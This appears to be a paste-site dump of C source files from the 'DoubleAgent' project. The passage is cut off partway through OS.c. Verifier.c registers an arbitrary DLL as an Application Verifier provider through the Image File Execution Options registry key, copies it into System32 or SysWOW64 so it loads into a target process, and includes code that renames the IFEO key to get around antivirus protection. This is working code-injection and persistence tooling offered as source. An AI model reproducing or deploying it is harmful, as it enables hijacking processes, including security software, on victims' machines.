02 January 2024"
jJzaptcQ,DoubleAgent/Verifier.h,FlyFar,C,Tuesday 2nd of January 2024 03:39:05 AM CDT,"#pragma once

/* Includes ******************************************************************/
#include <Windows.h>
#include ""Status.h""

/* Function Declarations *****************************************************/
/*
 * Installs an application verifier for the process
 */
DOUBLEAGENT_STATUS VERIFIER_Install(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName, IN PCWSTR pcwszVrfDllPathX86, IN PCWSTR pcwszVrfDllPathX64);
/*
 * In some cases (application crash, exception, etc.) the install\uninstall functions may accidentally leave the machine in an undefined state
 * Repairs the machine to its original state
 */
DOUBLEAGENT_STATUS VERIFIER_Repair(VOID);
/*
 * Uninstalls the application verifier from the process
 */
VOID VERIFIER_Uninstall(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName);"
RVZrEJJF,DoubleAgent/Verifier.c,FlyFar,Objective C,Tuesday 2nd of January 2024 03:36:53 AM CDT,"/* Includes ******************************************************************/
#include <Windows.h>
#include <Shlwapi.h>
#include <crtdbg.h>
#include ""Status.h""
#include ""OS.h""
#include ""Path.h""
#include ""Verifier.h""

/* Macros ********************************************************************/
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME L""Image File Execution Options""
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP L""3cf9a53d-a1f5-4945-ac5b-5e87bbf46ad2""
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY (L""SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"" ## VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME)
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP (L""SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"" ## VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP)
#define VERIFIER_SYSWOW64_PATH (L""C:\\Windows\\SysWOW64"")
#define VERIFIER_SYSNATIVE_PATH (L""C:\\Windows\\Sysnative"")
#define VERIFIER_SYSTEM32_PATH (L""C:\\Windows\\System32"")
#define VERIFIER_VERIFIERDLLS_VALUE_NAME (L""VerifierDlls"")
#define VERIFIER_GLOBALFLAG_VALUE_NAME (L""GlobalFlag"")
#define VERIFIER_FLG_APPLICATION_VERIFIER (0x100)

/* Function Declarations *****************************************************/
/*
 * Registers the verifier dll to the process
 */
static DOUBLEAGENT_STATUS verifier_Register(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName);
/*
 * Unregisters the verifier dll from the process
 */
static VOID verifier_Unregister(IN PCWSTR pcwszProcessName);
/*
 * Gets the installation path for the x86 verifier dll
 * The installation path must be freed via HeapFree
 */
static DOUBLEAGENT_STATUS verifier_GetInstallPathX86(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath);
/*
 * Gets the installation path for the x64 verifier dll
 * The installation path must be freed via HeapFree
 */
static DOUBLEAGENT_STATUS verifier_GetInstallPathX64(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath);

/* Public Function Definitions ***********************************************/
DOUBLEAGENT_STATUS VERIFIER_Install(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName, IN PCWSTR pcwszVrfDllPathX86, IN PCWSTR pcwszVrfDllPathX64)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	OS_ARCHITECTURE eOsArchitecture = OS_ARCHITECTURE_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathX86 = NULL;
	PWSTR pwszVrfDllInstallPathX64 = NULL;
	BOOL bRegistered = FALSE;
	BOOL bCopiedX86 = FALSE;
	BOOL bCopiedX64 = FALSE;

	/* Validates the parameters */
	if ((NULL == pcwszProcessName) || (NULL == pcwszVrfDllName) || (NULL == pcwszVrfDllPathX86) || (NULL == pcwszVrfDllPathX64))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_INVALID_PARAMS);
		goto lbl_cleanup;
	}

	/* Gets the operating system architecture */
	eStatus = OS_GetArchitecture(&eOsArchitecture);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}

	/* Registers the verifier dll to the process */
	eStatus = verifier_Register(pcwszProcessName, pcwszVrfDllName);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
	bRegistered = TRUE;

	switch (eOsArchitecture)
	{
	case OS_ARCHITECTURE_X64:
		/* Gets the install path for the x64 verifier dll */
		eStatus = verifier_GetInstallPathX64(pcwszVrfDllName, &pwszVrfDllInstallPathX64);
		if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
		{
			goto lbl_cleanup;
		}

		/* Copies the x64 verifier dll to its installation path */
		if (FALSE == CopyFileW(pcwszVrfDllPathX64, pwszVrfDllInstallPathX64, FALSE))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_COPYFILEW_FAILED_X64);
			goto lbl_cleanup;
		}
		bCopiedX64 = TRUE;
		/* Falls into the x86 case */
	case OS_ARCHITECTURE_X86:
		/* Gets the install path for the x86 verifier dll */
		eStatus = verifier_GetInstallPathX86(pcwszVrfDllName, &pwszVrfDllInstallPathX86);
		if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
		{
			goto lbl_cleanup;
		}

		/* Copies the x86 verifier dll to its installation path */
		if (FALSE == CopyFileW(pcwszVrfDllPathX86, pwszVrfDllInstallPathX86, FALSE))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_COPYFILEW_FAILED_X86);
			goto lbl_cleanup;
		}
		bCopiedX86 = TRUE;
		break;
	default:
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_UNSUPPORTED_SWITCH_CASE);
		goto lbl_cleanup;
	}

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* If failed, reverts the changes */
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		if (FALSE != bCopiedX86)
		{
			/* Deletes the x86 verifier dll */
			(VOID)DeleteFileW(pwszVrfDllInstallPathX86);
			bCopiedX86 = FALSE;
		}

		if (FALSE != bCopiedX64)
		{
			/* Deletes the x64 verifier dll */
			(VOID)DeleteFileW(pwszVrfDllInstallPathX64);
			bCopiedX64 = FALSE;
		}

		/* Unregisters the verifier dll */
		if (FALSE != bRegistered)
		{
			verifier_Unregister(pcwszProcessName);
			bRegistered = FALSE;
		}
	}

	/* Frees the x86 install path */
	if (NULL != pwszVrfDllInstallPathX86)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX86);
		pwszVrfDllInstallPathX86 = NULL;
	}

	/* Frees the x64 install path */
	if (NULL != pwszVrfDllInstallPathX64)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX64);
		pwszVrfDllInstallPathX64 = NULL;
	}

	/* Returns status */
	return eStatus;
}

DOUBLEAGENT_STATUS VERIFIER_Repair(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	HKEY hIfeoKey = NULL;
	LONG lOpenKeyStatus = 0;

	/*
	 * In some cases (application crash, exception, etc.) the install\uninstall functions may accidentally leave the IFEO key with its temporary name
	 * Checks if the temporary name exists
	 */
	lOpenKeyStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_WRITE | KEY_WOW64_64KEY, &hIfeoKey);
	if (ERROR_SUCCESS == lOpenKeyStatus)
	{
		/* Repairs the IFEO key by restoring it to its original name */
		if (ERROR_SUCCESS != RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REPAIR_REGRENAMEKEY_FAILED);
			goto lbl_cleanup;
		}
	}
	else if (ERROR_FILE_NOT_FOUND == lOpenKeyStatus)
	{
		/* Everything is OK, nothing to repair */
	}
	else
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REPAIR_REGOPENKEYEXW_FAILED);
		goto lbl_cleanup;
	}

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Closes the IFEO key */
	if (NULL != hIfeoKey)
	{
		(VOID)RegCloseKey(hIfeoKey);
		hIfeoKey = NULL;
	}

	/* Returns status */
	return eStatus;
}

VOID VERIFIER_Uninstall(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName)
{
	OS_ARCHITECTURE eOsArchitecture = OS_ARCHITECTURE_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathX86 = NULL;
	PWSTR pwszVrfDllInstallPathX64 = NULL;

	/* Validates the parameters */
	if ((NULL != pcwszProcessName) && (NULL != pcwszVrfDllName))
	{
		/* Gets the operating system architecture */
		if (FALSE != DOUBLEAGENT_SUCCESS(OS_GetArchitecture(&eOsArchitecture)))
		{
			switch (eOsArchitecture)
			{
			case OS_ARCHITECTURE_X64:
				/* Gets the install path for the x64 verifier dll */
				if (FALSE != DOUBLEAGENT_SUCCESS(verifier_GetInstallPathX64(pcwszVrfDllName, &pwszVrfDllInstallPathX64)))
				{
					/* Deletes the x64 verifier dll */
					(VOID)DeleteFileW(pwszVrfDllInstallPathX64);

					/* Frees the x64 install path */
					(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX64);
					pwszVrfDllInstallPathX64 = NULL;
				}
				/* Falls into the x86 case */
			case OS_ARCHITECTURE_X86:
				/* Gets the install path for the x86 verifier dll */
				if (FALSE != DOUBLEAGENT_SUCCESS(verifier_GetInstallPathX86(pcwszVrfDllName, &pwszVrfDllInstallPathX86)))
				{
					/* Deletes the x86 verifier dll */
					(VOID)DeleteFileW(pwszVrfDllInstallPathX86);

					/* Frees the x86 install path */
					(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX86);
					pwszVrfDllInstallPathX86 = NULL;
				}
				break;
			}
		}

		/* Unregisters the verifier dll */
		verifier_Unregister(pcwszProcessName);
	}
}

/* Private Function Definitions **********************************************/
static DOUBLEAGENT_STATUS verifier_Register(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	HKEY hIfeoKey = NULL;
	HKEY hIfeoKeyTemp = NULL;
	DWORD dwGlobalFlag = VERIFIER_FLG_APPLICATION_VERIFIER;
	DWORD dwVrfDllNameLenInBytes = 0;
	BOOL bKeyRenamed = FALSE;
	BOOL bCreatedVerifierDlls = FALSE;
	BOOL bCreatedVerifierDllsTemp = FALSE;
	BOOL bCreatedGlobalFlag = FALSE;
	BOOL bCreatedGlobalFlagTemp = FALSE;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszProcessName);
	_ASSERT(NULL != pcwszVrfDllName);

	/* Gets the verifier dll name length in bytes */
	dwVrfDllNameLenInBytes = (DWORD)(wcslen(pcwszVrfDllName) + 1) * sizeof(*pcwszVrfDllName);

	/* Opens the IFEO key */
	if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, 0, KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKey))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_IFEO);
		goto lbl_cleanup;
	}

	/* Creates the VerifierDlls value and sets it to the verifier dll name */
	bCreatedVerifierDlls = (ERROR_SUCCESS == RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes));

	/*
	 * Creates the GlobalFlag value and sets it to FLG_APPLICATION_VERIFIER
	 * Read more: https://msdn.microsoft.com/en-us/library/windows/hardware/ff542875(v=vs.85).aspx
	 */
	bCreatedGlobalFlag = (ERROR_SUCCESS == RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)));

	/*
	 * The key creation might fail because some antiviruses protect the keys of their processes under the IFEO
	 * One possible bypass is to rename the IFEO key name to a temporary name, create the keys, and restores the IFEO key name
	 */
	if ((FALSE == bCreatedVerifierDlls) || (FALSE == bCreatedGlobalFlag))
	{
		/* Renames the IFEO key name to a temporary name */
		if (ERROR_SUCCESS != RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGRENAMEKEY_FAILED);
			goto lbl_cleanup;
		}
		bKeyRenamed = TRUE;

		/*
		 * Opens the temporary IFEO key
		 * The key is reopened because some antiviruses continue monitoring and blocking the handle that opened the original IFEO
		 */
		if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKeyTemp))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_TEMP_IFEO);
			goto lbl_cleanup;
		}

		if (FALSE == bCreatedVerifierDlls)
		{
			/* Tries again to create the VerifierDlls value */
			if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes))
			{
				DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_VERIFIERDLLS);
				goto lbl_cleanup;
			}
			bCreatedVerifierDllsTemp = TRUE;
		}

		if (FALSE == bCreatedGlobalFlag)
		{
			/* Tries again to create the GlobalFlag value */
			if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)))
			{
				DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_GLOBALFLAG);
				goto lbl_cleanup;
			}
			bCreatedGlobalFlagTemp = TRUE;
		}
	}

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* If failed, reverts the changes */
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		/* Deletes the GlobalFlag temp value */
		if (FALSE != bCreatedGlobalFlagTemp)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
			bCreatedGlobalFlagTemp = FALSE;
		}

		/* Deletes the VerifierDlls temp value */
		if (FALSE != bCreatedVerifierDllsTemp)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
			bCreatedVerifierDllsTemp = FALSE;
		}

		/* Deletes the GlobalFlag value */
		if (FALSE != bCreatedGlobalFlag)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
			bCreatedGlobalFlag = FALSE;
		}

		/* Deletes the VerifierDlls value */
		if (FALSE != bCreatedVerifierDlls)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
			bCreatedVerifierDlls = FALSE;
		}
	}

	/* Closes the temporary IFEO key */
	if (NULL != hIfeoKeyTemp)
	{
		(VOID)RegCloseKey(hIfeoKeyTemp);
		hIfeoKeyTemp = NULL;
	}

	/* Restores the IFEO key name */
	if (FALSE != bKeyRenamed)
	{
		(VOID)RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME);
		bKeyRenamed = FALSE;
	}

	/* Closes the IFEO key */
	if (NULL != hIfeoKey)
	{
		(VOID)RegCloseKey(hIfeoKey);
		hIfeoKey = NULL;
	}

	/* Returns status */
	return eStatus;
}

static VOID verifier_Unregister(IN PCWSTR pcwszProcessName)
{
	HKEY hIfeoKey = NULL;
	HKEY hIfeoKeyTemp = NULL;
	BOOL bDeletedVerifierDlls = FALSE;
	BOOL bDeletedGlobalFlag = FALSE;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszProcessName);

	/* Opens the IFEO key */
	if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, 0, KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKey))
	{
		/* Deletes the VerifierDlls value */
		bDeletedVerifierDlls = (ERROR_SUCCESS == RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME));

		/* Deletes the GlobalFlag value */
		bDeletedGlobalFlag = (ERROR_SUCCESS == RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME));

		/*
		 * The key deletion might fail because some antiviruses protect the keys of their processes under the IFEO
		 * One possible bypass is to rename the IFEO key name to a temporary name, delete the keys, and restores the IFEO key name
		 */
		if ((FALSE == bDeletedVerifierDlls) || (FALSE == bDeletedGlobalFlag))
		{
			/* Renames the IFEO key name to a temporary name */
			if (ERROR_SUCCESS == RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
			{
				/*
				 * Opens the temporary IFEO key
				 * The key is reopened because some antiviruses continue monitoring and blocking the handle that opened the original IFEO
				 */
				if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKeyTemp))
				{
					/* Tries again to delete the VerifierDlls value */
					if (FALSE == bDeletedVerifierDlls)
					{
						(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
						bDeletedVerifierDlls = TRUE;
					}

					/* Tries again to delete the GlobalFlag value */
					if (FALSE == bDeletedGlobalFlag)
					{
						(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
						bDeletedGlobalFlag = TRUE;
					}

					/* Closes the temporary IFEO key */
					(VOID)RegCloseKey(hIfeoKeyTemp);
					hIfeoKeyTemp = NULL;
				}

				/* Restores the IFEO key name */
				(VOID)RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME);
			}
		}

		/* Closes the IFEO key */
		(VOID)RegCloseKey(hIfeoKey);
		hIfeoKey = NULL;
	}
}

static DOUBLEAGENT_STATUS verifier_GetInstallPathX86(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathLocal = NULL;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszVrfDllName);
	_ASSERT(NULL != ppwszVrfDllInstallPath);

#ifndef _WIN64
	/*
	 * x86 OS - Path should be System32
	 * x64 OS - Path should be SysWOW64 (File system redirection would implicitly convert System32 to SysWOW64)
	 */
	eStatus = PATH_Combine(VERIFIER_SYSTEM32_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#else
	/*
	 * x86 OS - Impossible (Can't run x64 code on x86 OS)
	 * x64 OS - Path should be SysWOW64
	 */
	eStatus = PATH_Combine(VERIFIER_SYSWOW64_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#endif

	/* Sets the received parameters */
	*ppwszVrfDllInstallPath = pwszVrfDllInstallPathLocal;
	pwszVrfDllInstallPathLocal = NULL;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Frees the install path */
	if (NULL != pwszVrfDllInstallPathLocal)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathLocal);
		pwszVrfDllInstallPathLocal = NULL;
	}

	/* Returns status */
	return eStatus;
}

static DOUBLEAGENT_STATUS verifier_GetInstallPathX64(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathLocal = NULL;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszVrfDllName);
	_ASSERT(NULL != ppwszVrfDllInstallPath);

#ifndef _WIN64
	/* x64 OS - Path should be System32 (File system redirection would implicitly convert Sysnative to System32) */
	eStatus = PATH_Combine(VERIFIER_SYSNATIVE_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#else
	/* x64 OS - Path should be System32 */
	eStatus = PATH_Combine(VERIFIER_SYSTEM32_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#endif

	/* Sets the received parameters */
	*ppwszVrfDllInstallPath = pwszVrfDllInstallPathLocal;
	pwszVrfDllInstallPathLocal = NULL;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Frees the install path */
	if (NULL != pwszVrfDllInstallPathLocal)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathLocal);
		pwszVrfDllInstallPathLocal = NULL;
	}

	/* Returns status */
	return eStatus;
}"
HjZTJVGN,DoubleAgent/Path.h,FlyFar,C,Tuesday 2nd of January 2024 03:36:00 AM CDT,"#pragma once

/* Includes ******************************************************************/
#include <Windows.h>
#include ""Status.h""

/* Function Declarations *****************************************************/
/*
 * Receives a file path and returns its directory path
 * The directory path must be freed via HeapFree
 */
DOUBLEAGENT_STATUS PATH_GetDirectory(IN PCWSTR pcwszFilePath, OUT PWSTR *ppwszDirPath);
/*
 * Receives two file paths and combines them into a single valid path
 * The combined path must be freed via HeapFree
 */
DOUBLEAGENT_STATUS PATH_Combine(IN PCWSTR pcwszPath1, IN PCWSTR pcwszPath2, OUT PWSTR *ppwszCombined);"
eVjRLXSV,DoubleAgent/Path.c,FlyFar,C,Tuesday 2nd of January 2024 03:34:39 AM CDT,"/* Includes ******************************************************************/
#include <Windows.h>
#include <Shlwapi.h>
#include ""Status.h""
#include ""Path.h""

/* Public Function Definitions ***********************************************/
DOUBLEAGENT_STATUS PATH_GetDirectory(IN PCWSTR pcwszFilePath, OUT PWSTR *ppwszDirPath)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	PWSTR pwszDirPathLocal = NULL;
	SIZE_T nFilePathLenInBytes = 0;

	/* Validates the parameters */
	if ((NULL == pcwszFilePath) || (NULL == ppwszDirPath))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_PATH_GETDIRECTORY_INVALID_PARAMS);
		goto lbl_cleanup;
	}

	/* Gets the file path length in bytes */
	nFilePathLenInBytes = (wcslen(pcwszFilePath) + 1) * sizeof(*pcwszFilePath);

	/* Allocates the directory path */
	pwszDirPathLocal = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nFilePathLenInBytes);
	if (NULL == pwszDirPathLocal)
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_PATH_GETDIRECTORY_HEAPALLOC_FAILED);
		goto lbl_cleanup;
	}

	/* Copies the file path to the directory path */
	CopyMemory(pwszDirPathLocal, pcwszFilePath, nFilePathLenInBytes);

	/* Creates the directory path by removing the file name */
	if (FALSE == PathRemoveFileSpecW(pwszDirPathLocal))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_PATH_GETDIRECTORY_PATHREMOVEFILESPECW_FAILED);
		goto lbl_cleanup;
	}

	/* Sets the received parameters */
	*ppwszDirPath = pwszDirPathLocal;
	pwszDirPathLocal = NULL;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Frees the directory path */
	if (NULL != pwszDirPathLocal)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszDirPathLocal);
		pwszDirPathLocal = NULL;
	}

	/* Returns status */
	return eStatus;
}

DOUBLEAGENT_STATUS PATH_Combine(IN PCWSTR pcwszPath1, IN PCWSTR pcwszPath2, OUT PWSTR *ppwszCombined)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	PWSTR pwszCombinedLocal = NULL;

	/* Validates the parameters */
	if ((NULL == pcwszPath1) || (NULL == pcwszPath2) || (NULL == ppwszCombined))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_PATH_COMBINE_INVALID_PARAMS);
		goto lbl_cleanup;
	}

	/* Allocates the combined path */
	pwszCombinedLocal = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
	if (NULL == pwszCombinedLocal)
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_PATH_COMBINE_HEAPALLOC_FAILED);
		goto lbl_cleanup;
	}

	/* Combines the paths */
	if (NULL == PathCombineW(pwszCombinedLocal, pcwszPath1, pcwszPath2))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_PATH_COMBINE_PATHCOMBINEW_FAILED);
		goto lbl_cleanup;
	}

	/* Sets the received parameters */
	*ppwszCombined = pwszCombinedLocal;
	pwszCombinedLocal = NULL;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Frees the combined path */
	if (NULL != pwszCombinedLocal)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszCombinedLocal);
		pwszCombinedLocal = NULL;
	}

	/* Returns status */
	return eStatus;
}"
khRwMCGK,DoubleAgent/OS.h,FlyFar,C,Tuesday 2nd of January 2024 03:34:15 AM CDT,"#pragma once

/* Includes ******************************************************************/
#include <Windows.h>
#include ""Status.h""

/* Types *********************************************************************/
typedef enum _OS_ARCHITECTURE
{
	OS_ARCHITECTURE_INVALID_VALUE = -1,
	OS_ARCHITECTURE_X86,
	OS_ARCHITECTURE_X64,

	/* Must be last */
	OS_ARCHITECTURE_COUNT
} OS_ARCHITECTURE, *POS_ARCHITECTURE;

/* Function Declarations *****************************************************/
/*
 * Gets the operating system architecture
 */
DOUBLEAGENT_STATUS OS_GetArchitecture(OUT POS_ARCHITECTURE peOsArchitecture);"
eCSWK6Fi,DoubleAgent/OS.c,FlyFar,C,Tuesday 2nd of January 2024 03:33:13 AM CDT,"/* Includes ******************************************************************/
#include <Windows.h>
#include ""Status.h""
#include ""OS.h""

/* Public Function Definitions ***********************************************/
DOUBLEAGENT_STATUS OS_GetArchitecture(OUT POS_ARCHITECTURE peOsArchitecture)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	OS_ARCHITECTURE eOsArchitectureLocal = OS_ARCHITECTURE_INVALID_VALUE;
#ifndef _WIN64
	BOOL bIsWow64 = FALSE;
#endif

	/* Validates the parameters */
	if (NULL == peOsArchitecture)
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_OS_GETARCHITECTURE_INVALID_PARAMS);
		goto lbl_cleanup;
	}

#ifdef _WIN64
	/* The program is executing 64 bit code, the OS must be 64 bit */
	eOsArchitectureLocal = OS_ARCHITECTURE_X64;
#else
	/* The program is executing 32 bit code, checks the OS architecture */
	if (FALSE == IsWow64Process(GetCurrentProcess(), &bIsWow64))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_OS_GETARCHITECTURE_ISWOW64PROCESS_FAILED);
		goto lbl_cleanup;
	}

	if (FALSE != bIsWow64)
	{
